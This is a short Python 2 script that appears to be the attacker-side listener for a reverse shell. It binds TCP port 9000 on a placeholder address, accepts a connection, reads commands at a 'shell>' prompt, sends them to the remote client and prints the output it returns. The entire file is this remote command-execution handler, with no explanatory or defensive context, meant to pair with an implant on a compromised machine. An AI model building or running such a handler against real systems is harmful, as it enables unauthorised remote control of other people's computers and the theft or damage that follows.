#!/usr/bin/env python
import socket
import sys

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

server.bind(("your ip",9000))
server.listen(1)
while(1):
	client,addr = server.accept()
	print "Connecting with ",addr
	command = raw_input("shell>")
	if 'terminate' in command:
		client.send('terminate')
		break
	else:
		client.send(command)
		data = client.recv(2048)
		print data
		
		
	
